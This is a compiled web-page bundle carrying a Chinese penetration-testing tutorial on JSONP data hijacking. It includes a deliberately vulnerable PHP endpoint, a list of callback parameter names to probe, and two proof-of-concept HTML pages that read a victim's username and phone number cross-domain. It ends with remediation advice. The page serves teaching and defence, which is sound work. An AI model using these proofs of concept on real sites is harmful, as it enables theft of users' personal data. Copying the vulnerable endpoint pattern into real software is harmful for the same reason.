"use strict";(self.webpackChunkblog_source_2025=self.webpackChunkblog_source_2025||[]).push([[5624],{636:(e,n,s)=>{s.d(n,{A:()=>c});const c=s.p+"assets/images/image-20220322173916125-868428aaf2bba56211455e660fad2242.png"},4293:(e,n,s)=>{s.d(n,{A:()=>c});const c=s.p+"assets/images/image-20220322185037473-f682cd4a5b7cbef11bc39138ff1e0687.png"},11526:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>a,contentTitle:()=>r,default:()=>o,frontMatter:()=>i,metadata:()=>c,toc:()=>d});const c=JSON.parse('{"id":"\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/JSONP\u6570\u636e\u52ab\u6301/README","title":"JSONP\u6570\u636e\u52ab\u6301","description":"\u4ecb\u7ecd","source":"@site/docs/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/15.JSONP\u6570\u636e\u52ab\u6301/README.md","sourceDirName":"01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/15.JSONP\u6570\u636e\u52ab\u6301","slug":"/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/JSONP\u6570\u636e\u52ab\u6301/","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/JSONP\u6570\u636e\u52ab\u6301/","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{},"sidebar":"knowledgeBaseSidebar","previous":{"title":"SAML\u6d4b\u8bd5","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SAML\u6d4b\u8bd5/"},"next":{"title":"CORS\u8de8\u57df\u6570\u636e\u52ab\u6301","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/CORS\u8de8\u57df\u6570\u636e\u52ab\u6301/"}}');var l=s(74848),t=s(28453);const i={},r="JSONP\u6570\u636e\u52ab\u6301",a={},d=[{value:"\u4ecb\u7ecd",id:"\u4ecb\u7ecd",level:2},{value:"\u6f0f\u6d1e\u539f\u7406",id:"\u6f0f\u6d1e\u539f\u7406",level:2},{value:"\u6f0f\u6d1e\u73af\u5883",id:"\u6f0f\u6d1e\u73af\u5883",level:2},{value:"\u5229\u7528\u573a\u666f",id:"\u5229\u7528\u573a\u666f",level:2},{value:"\u6f0f\u6d1e\u5229\u7528",id:"\u6f0f\u6d1e\u5229\u7528",level:2},{value:"POC",id:"poc",level:3},{value:"\u53e6\u4e00\u4e2aPOC",id:"\u53e6\u4e00\u4e2apoc",level:3},{value:"\u4fee\u590d\u5efa\u8bae",id:"\u4fee\u590d\u5efa\u8bae",level:2},{value:"\u6269\u5c55",id:"\u6269\u5c55",level:2}];function h(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",ul:"ul",...(0,t.R)(),...e.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsx)(n.header,{children:(0,l.jsx)(n.h1,{id:"jsonp\u6570\u636e\u52ab\u6301",children:"JSONP\u6570\u636e\u52ab\u6301"})}),"\n",(0,l.jsx)(n.h2,{id:"\u4ecb\u7ecd",children:"\u4ecb\u7ecd"}),"\n",(0,l.jsxs)(n.p,{children:['JSONP\uff08JSON with Padding\uff09\u662f json \u7684\u4e00\u79cd"\u4f7f\u7528\u6a21\u5f0f"\uff0c\u53ef\u4ee5\u8ba9\u7f51\u9875\u4ece\u522b\u7684\u57df\u540d\uff08\u7f51\u7ad9\uff09\u90a3\u83b7\u53d6\u8d44\u6599\uff0c\u5373\u8de8\u57df\u8bfb\u53d6\u6570\u636e\uff1b\u5b83\u5229\u7528\u7684\u662f',(0,l.jsx)(n.code,{children:"script"}),"\u6807\u7b7e\u7684src\u5c5e\u6027\u4e0d\u53d7\u540c\u6e90\u7b56\u7565\u5f71\u54cd\u7684\u7279\u6027\uff0c\u4f7f\u7f51\u9875\u53ef\u4ee5\u5f97\u5230\u4ece\u5176\u4ed6\u6765\u6e90\u52a8\u6001\u4ea7\u751f\u7684json\u6570\u636e\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528\u6765\u5b9e\u73b0\u8de8\u57df\u8bfb\u53d6\u6570\u636e\u3002"]}),"\n",(0,l.jsxs)(n.p,{children:["\u66f4\u901a\u4fd7\u7684\u8bf4\u6cd5\uff1aJSONP\u5c31\u662f\u5229\u7528 ",(0,l.jsx)(n.code,{children:"<script>"})," \u6807\u7b7e\u7684\u8de8\u57df\u80fd\u529b\u5b9e\u73b0\u8de8\u57df\u6570\u636e\u7684\u8bbf\u95ee\uff0c\u8bf7\u6c42\u52a8\u6001\u751f\u6210\u7684JavaScript\u811a\u672c\u540c\u65f6\u5e26\u4e00\u4e2acallback\u51fd\u6570\u540d\u4f5c\u4e3a\u53c2\u6570\u3002\u670d\u52a1\u7aef\u6536\u5230\u8bf7\u6c42\u540e\uff0c\u52a8\u6001\u751f\u6210\u811a\u672c\u4ea7\u751f\u6570\u636e\uff0c\u5e76\u5728\u4ee3\u7801\u4e2d\u4ee5\u4ea7\u751f\u7684\u6570\u636e\u4e3a\u53c2\u6570\u8c03\u7528callback\u51fd\u6570\u3002"]}),"\n",(0,l.jsx)(n.h2,{id:"\u6f0f\u6d1e\u539f\u7406",children:"\u6f0f\u6d1e\u539f\u7406"}),"\n",(0,l.jsx)(n.p,{children:"\u548cCSRF\u7c7b\u4f3c\uff0c\u90fd\u9700\u8981\u7528\u6237\u4ea4\u4e92\uff0c\u800cCSRF\u4e3b\u8981\u662f\u4ee5\u7528\u6237\u7684\u8d26\u6237\u8fdb\u884c\u589e\u5220\u6539\u7684\u64cd\u4f5c\uff0cjsonp\u5219\u4e3b\u8981\u7528\u6765\u52ab\u6301\u6570\u636e\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u5f53\u7f51\u7ad9\u901a\u8fc7JSONP\u65b9\u5f0f\u4f20\u9012\u7528\u6237\u654f\u611f\u4fe1\u606f\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f2a\u9020JSONP\u8c03\u7528\u9875\u9762\uff0c\u8bf1\u5bfc\u88ab\u653b\u51fb\u8005\u8bbf\u95ee\u6765\u8fbe\u5230\u7a83\u53d6\u7528\u6237\u4fe1\u606f\u7684\u76ee\u7684\uff1bjsonp\u6570\u636e\u52ab\u6301\u5c31\u662f\u653b\u51fb\u8005\u83b7\u53d6\u4e86\u672c\u5e94\u8be5\u4f20\u7ed9\u7f51\u7ad9\u5176\u4ed6\u63a5\u53e3\u7684\u6570\u636e\u3002"}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.p,{children:"[!note]"}),"\n",(0,l.jsx)(n.p,{children:"\u53ef\u80fd\u8fd8\u662f\u6709\u70b9\u62bd\u8c61\uff0c\u53ef\u4ee5\u7ee7\u7eed\u5f80\u540e\u770b\u4f8b\u5b50\uff0c\u5176\u5b9e\u5f88\u7b80\u5355"}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"\u6f0f\u6d1e\u73af\u5883",children:"\u6f0f\u6d1e\u73af\u5883"}),"\n",(0,l.jsxs)(n.p,{children:["\u5047\u8bbe\u8fd9\u662f\u76ee\u6807\u7f51\u7ad9\u4e0a\u7684\u4ee3\u7801\uff0c\u7136\u540e\u6211\u4eec\u5229\u7528\u6f0f\u6d1e\u5c31\u53ef\u4ee5\u52ab\u6301\u5230\u91cc\u9762\u7684\u6570\u636e\uff0c\u5982",(0,l.jsx)(n.code,{children:"username"}),"\u3001",(0,l.jsx)(n.code,{children:"phone"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:'<?php\n//test.php\nheader(\'Content-type: application/json\');\n$callback = $_GET[\'callback\'];\nprint $callback.\'({"username" : "d4m1ts","phone" : "13888888888"});\';\n?>\n'})}),"\n",(0,l.jsx)(n.p,{children:"\u5feb\u901f\u542f\u52a8php\u73af\u5883"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-shell",children:"php -S 127.0.0.1:9999\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u5b9e\u73b0\u6548\u679c"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"image-20220322170858620",src:s(52500).A+"",width:"2094",height:"1008"})}),"\n",(0,l.jsx)(n.h2,{id:"\u5229\u7528\u573a\u666f",children:"\u5229\u7528\u573a\u666f"}),"\n",(0,l.jsxs)(n.p,{children:["\u5982\u4e0a\u56fe\uff0c\u6240\u6709\u5305\u542b\u6709",(0,l.jsx)(n.code,{children:"callback"}),"\u7b49\u56de\u8c03\u51fd\u6570\u7684\uff0c\u4e14\u8bf7\u6c42\u65b9\u5f0f\u4e3aGET\uff0c\u6ca1\u6709\u9a8c\u8bc1referer\u7b49\uff0c\u90fd\u53ef\u4ee5\u5c1d\u8bd5\u4e0b\u8be5\u6f0f\u6d1e"]}),"\n",(0,l.jsx)(n.p,{children:"\u5982\u679c\u8fd4\u56de\u5185\u5bb9\u662fjson\u683c\u5f0f\u7684\uff0c\u4f46\u662f\u6ca1\u6709\u56de\u8c03\u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u624b\u52a8\u6dfb\u52a0\u56de\u8c03\u51fd\u6570\u53bb\u8bd5\u8bd5\u8fd0\u6c14\uff0c\u4e00\u4e9b\u5e38\u89c1\u7684\u5982\u4e0b\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"_callback=mstkey\n_cb=mstkey\ncallback=mstkey\ncb=mstkey\njsonp=mstkey\njsonpcallback=mstkey\njsonpcb=mstkey\njsonp_cb=mstkey\njson=mstkey\njsoncallback=mstkey\njcb=mstkey\ncall=mstkey\ncallBack=mstkey\njsonpCallback=mstkey\njsonpCb=mstkey\njsonp_Cb=mstkey\njsonCallback=mstkey\nca=mstkey\n"})}),"\n",(0,l.jsx)(n.h2,{id:"\u6f0f\u6d1e\u5229\u7528",children:"\u6f0f\u6d1e\u5229\u7528"}),"\n",(0,l.jsx)(n.p,{children:"\u5f53\u6211\u4eec\u53d1\u73b0\u4fe1\u606f\u6cc4\u9732\u7684 jsonp \u63a5\u53e3\u4ee5\u540e\uff0c\u6211\u4eec\u9700\u8981\u6784\u9020\u4e00\u4e2a\u6076\u610fhtml\u9875\u9762\uff0c\u7136\u540e\u5f15\u8bf1\u53d7\u5bb3\u8005\u53bb\u8bbf\u95ee\u8fd9\u4e2a\u7f51\u7ad9\uff0c\u4e00\u65e6\u8bbf\u95ee\u4e86\u8fd9\u4e2a\u7f51\u7ad9\uff0c\u811a\u672c\u5c31\u4f1a\u81ea\u52a8\u8fd0\u884c\uff0c\u5c31\u4f1a\u5411\u8fd9\u4e2a\u63a5\u53e3\u8bf7\u6c42\u7528\u6237\u7684\u654f\u611f\u6570\u636e\uff0c\u5e76\u4f20\u9001\u5230\u653b\u51fb\u8005\u7684\u670d\u52a1\u5668\u4e0a\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u4e00\u56fe\u80dc\u5343\u8a00"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"jsonp-exploit",src:s(68074).A+"",width:"422",height:"445"})}),"\n",(0,l.jsx)(n.h3,{id:"poc",children:"POC"}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.p,{children:"\u57fa\u4e8e\u5b9e\u73b0\u56de\u8c03\u51fd\u6570"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-html",children:'<script>\nfunction xxx(data)\n{\n  alert(data.username);\n}\n<\/script>\n<script src="http://127.0.0.1:9999/test.php?callback=xxx"><\/script>\n'})}),"\n",(0,l.jsxs)(n.p,{children:["\u4fdd\u5b58\u4e3ahtml\uff0c\u8bf1\u5bfc\u53d7\u5bb3\u8005\u8bbf\u95ee\uff0c\u53ef\u89c1\u6210\u529f\u83b7\u53d6\u5230\u4e86",(0,l.jsx)(n.code,{children:"username"}),"\u4fe1\u606f"]}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"image-20220322171224615",src:s(46076).A+"",width:"1838",height:"774"})}),"\n",(0,l.jsxs)(n.p,{children:["\u7b80\u800c\u8a00\u4e4b\uff1a\u5b58\u5728\u4fe1\u606f\u6cc4\u6f0f\u7684JSONP\u63a5\u53e3",(0,l.jsx)(n.code,{children:"http://127.0.0.1:9999/test.php?callback=xxx"}),"\uff0c\u653b\u51fb\u8005\u6784\u9020POC\u540e\u8bf1\u5bfc\u7528\u6237\u8bbf\u95eePOC\uff0c\u7136\u540e\u5c31\u4f1a\u8c03\u7528\u8fd9\u4e2a\u63a5\u53e3\u83b7\u53d6\u5230\u654f\u611f\u6570\u636e\uff0c\u83b7\u53d6\u5230\u7684\u654f\u611f\u6570\u636e\u88ab\u653b\u51fb\u8005\u622a\u83b7\u4e86\u3002"]}),"\n",(0,l.jsx)(n.h3,{id:"\u53e6\u4e00\u4e2apoc",children:"\u53e6\u4e00\u4e2aPOC"}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.p,{children:"\u57fa\u4e8ejquery"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-html",children:'<script src="http://cdn.static.runoob.com/libs/jquery/1.8.3/jquery.js"><\/script>\n<script type="text/javascript">    \n    $.getJSON("http://127.0.0.1:9999/test.php?callback=?", function(data){\n          alert(data.phone);\n    });\n<\/script>\n'})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"image-20220322173916125",src:s(636).A+"",width:"1008",height:"412"})}),"\n",(0,l.jsx)(n.h2,{id:"\u4fee\u590d\u5efa\u8bae",children:"\u4fee\u590d\u5efa\u8bae"}),"\n",(0,l.jsxs)(n.ol,{children:["\n",(0,l.jsxs)(n.li,{children:["\u63a5\u53d7\u8bf7\u6c42\u65f6\u68c0\u67e5",(0,l.jsx)(n.code,{children:"referer"}),"\u6765\u6e90\uff1b"]}),"\n",(0,l.jsxs)(n.li,{children:["\u5728\u8bf7\u6c42\u4e2d\u6dfb\u52a0",(0,l.jsx)(n.code,{children:"token"}),"\u5e76\u5728\u540e\u7aef\u8fdb\u884c\u9a8c\u8bc1\uff1b"]}),"\n",(0,l.jsx)(n.li,{children:"\u4e25\u683c\u8fc7\u6ee4callback\u51fd\u6570\u540d\u53caJSON\u91cc\u6570\u636e\u7684\u8f93\u51fa\u3002"}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"\u6269\u5c55",children:"\u6269\u5c55"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u5982\u679c\u76ee\u6807\u7684header\u5934\u6ca1\u6709\u8bbe\u7f6e",(0,l.jsx)(n.code,{children:"Content-Type"}),"\u4e3a",(0,l.jsx)(n.code,{children:"json"}),"\uff0c\u800c\u662f",(0,l.jsx)(n.code,{children:"html"}),"\uff0c\u90a3\u4e48\u4e5f\u53ef\u4ee5\u9020\u6210XSS\u6f0f\u6d1e"]}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"http://www.piaoyi.org/network/get-qq-haoma-js.html",children:"\u4e00\u4e2a\u83b7\u53d6QQ\u53f7\u7684JSONP\u52ab\u6301\u5b9e\u4f8b"})}),"\n"]}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"image-20220322185037473",src:s(4293).A+"",width:"1386",height:"1498"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u63a8\u8350\u9605\u8bfb\uff1a",(0,l.jsx)(n.a,{href:"http://drops.xmd5.com/static/drops/papers-6630.html",children:"JSONP\u6316\u6398\u4e0e\u9ad8\u7ea7\u5229\u7528"})]}),"\n"]})]})}function o(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,l.jsx)(n,{...e,children:(0,l.jsx)(h,{...e})}):h(e)}},28453:(e,n,s)=>{s.d(n,{R:()=>i,x:()=>r});var c=s(96540);const l={},t=c.createContext(l);function i(e){const n=c.useContext(t);return c.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(l):e.components||l:i(e.components),c.createElement(t.Provider,{value:n},e.children)}},46076:(e,n,s)=>{s.d(n,{A:()=>c});const c=s.p+"assets/images/image-20220322171224615-4f28a9a4672cb7032ea6453f4fc56690.png"},52500:(e,n,s)=>{s.d(n,{A:()=>c});const c=s.p+"assets/images/image-20220322170858620-fff43fb2ebab50b52f3a4a315a067a82.png"},68074:(e,n,s)=>{s.d(n,{A:()=>c});const c=s.p+"assets/images/jsonp-exploit-571f0c7c2a56b293b317749171f0d12b.png"}}]);